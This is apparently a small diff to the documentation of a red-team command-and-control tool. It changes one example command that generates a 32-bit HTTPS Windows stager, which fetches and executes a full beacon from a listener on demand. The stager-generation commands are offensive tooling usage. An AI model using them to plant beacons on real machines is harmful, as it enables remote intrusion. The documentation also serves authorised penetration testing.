@@ -22,7 +22,7 @@ Generate minimal stagers (~50KB) that fetch and execute full beacons on-demand f
 generate stager windows http 192.168.1.10:8080
 
 # 32-bit HTTPS stager with proxy
-generate stager windows https 192.168.1.10:443 -r 32 -t http -a 127.0.0.1:8080
+generate stager windows https 192.168.1.10:443 -r 32 -t https -a 127.0.0.1:8080
 
 # Options:
 # -r, --arch: Target architecture (32 or 64, default: 64)
